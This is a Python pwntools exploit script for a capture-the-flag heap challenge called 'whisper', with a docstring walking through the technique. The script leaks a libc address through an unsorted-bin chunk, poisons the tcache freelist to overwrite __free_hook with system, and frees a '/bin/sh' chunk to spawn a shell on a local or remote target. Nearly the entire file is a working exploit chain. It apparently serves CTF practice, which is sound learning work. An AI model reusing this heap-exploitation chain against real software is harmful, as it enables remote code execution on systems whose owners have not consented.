#!/usr/bin/env python3
"""
The idea here is to leak a LIBC ADDRESS exploiting the UNSORTED BINS (which fd/bk contains libc address), 
then derivate the libc_base using gdb VMMAP (which shows the memory mappings of the running process) 
identifing the libc_base address derive the offset and use it into the script.
Now we can overwrite the __free_hook pointer with the address of system and then we can create another malloc with BINSH and when free(malloc(BINSH)) 
it trigger the execution of system(BINSH) spawing a shell

#------------ STEP 1 ------------
1)CREATE 2 malloc (with size 32 and one with size 0x500)
2)FREE those malloc (size 32-> tcache, size 0x500->unsorted bins)
3)SHOW the unsorted malloc that give us the fd and bd, that point into libc (LEAK)
4)CALCULATE the libc offset using gdb VMMAP, first we identify the libc_base address(run-time), then we calculate the offset(fixed) 
5)Using the offset we derive the libc_base

#------------ STEP 2 ------------
1)CREATE 2 malloc (size 32)
2)FREE those malloc (--> tcache)
3)EDIT of the "top" malloc with the __free_hook address
4)CREATE 1 mallocto consume the "top" malloc (that have fd = &__free_hook)
5)CREATE 1 malloc(with the second one we are writing into the __free_hook), and insert as data the SYSTEM address,
    so now the __free_hook() calls the system() 
6)CREATE 1 malloc (size 32) that have as data BINSH
7)FREE that malloc, so when free(malloc) is called, is executed system(malloc1)--> system(BINSH)



"""
from pwn import *

exe = ELF("./whisper_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

rop_lib=ROP(libc)

context.binary = exe
context.log_level="debug"

def conn():
    if args.REMOTE:
        p = remote("offsec.m0lecon.it", 13544)
        if args.GDB:
            gdb.attach(r)
    else:
        p = process([exe.path])

    return p


def main():
    p = conn()

    #------------ STEP 1 : LEAK LIBC ------------   unsorted bins for the libc leak
    #   
    #CREATE(index=1)
    p.sendlineafter(b'> ', b'1')   #create malloc
    p.sendlineafter(b'index: ', b'1')
    p.sendlineafter(b'size: ', b'1280')
    p.sendafter(b'data: ', b"A".ljust(0x500, b"X")) 
    
    #CREATE(index=2)
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'2')
    p.sendlineafter(b'size: ', b'32')
    p.sendafter(b'data: ', b"B" * 8)

    
    #FREE(index=1) --> unsorted bins
    p.sendlineafter(b'> ', b'2')   #create malloc
    p.sendlineafter(b'index: ', b'1') 
    # good luck pwning :)
    
    #FREE(index=2) --> tcahce
    p.sendlineafter(b'> ', b'2')   #create malloc
    p.sendlineafter(b'index: ', b'2')#--> tchache
    log.info("VIEW")
    
    #(LIBC LEACK)
    p.sendlineafter(b'> ', b'4')   #create malloc
    p.sendlineafter(b'index: ', b'1')
    libc_leak=p.recvline()
    print(libc_leak)
    fd = u64(libc_leak[:8]) #<-- is a libc address 
    bd = u64(libc_leak[8:16])
    #print(hex(fd),hex(bd))
    LIBC_OFFSET= 0x1ecbe0 # calcolato con vmmap in gdb 
    log.info("LIBC LEAK")
    libc_base = fd - LIBC_OFFSET
    #print(hex(libc_base))
    libc.address=libc_base

    BINSH = next(libc.search(b'/bin/sh'))
    SYSTEM = libc.sym["system"]
    FREE_HOOK = libc.sym['__free_hook']
    print("FREE_HOOK",hex(FREE_HOOK))

    #------------ STEP 2 : hijack __free_hook ------------ tcache for hijacking 

    #CREATE(index=3)
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'3')
    p.sendlineafter(b'size: ', b'32')
    p.sendafter(b'data: ', b"A"*8)

    #CREATE(index=4)
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'4')
    p.sendlineafter(b'size: ', b'32')
    p.sendafter(b'data: ', b"A"*8)

    #FREE(index=3) 
    p.sendlineafter(b'> ', b'2')   
    p.sendlineafter(b'index: ', b'3') 
    

    #FREE(index=4) 
    p.sendlineafter(b'> ', b'2')   
    p.sendlineafter(b'index: ', b'4') 
    

    #EDIT(index=4)
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', b'4')
    p.sendafter(b'data: ', p64(FREE_HOOK))
    #gdb.attach(p)
    #pause()

    
    # CREATE(index=5)
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'5')
    p.sendlineafter(b'size: ', b'32')
    p.sendafter(b'data: ', b'C' * 8)

    # CREATE(index=6)
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'6')
    p.sendlineafter(b'size: ', b'32')
    p.sendafter(b'data: ', p64(SYSTEM)) #<-- write system inside __free_hook

    
    # CREATE (index=7)
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'7')
    p.sendlineafter(b'size: ', b'32')
    p.sendafter(b'data: ', b'/bin/sh\x00')

    # FREE(index=8) -> system("/bin/sh")
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', b'7')



    p.interactive()

if __name__ == "__main__":
    main()
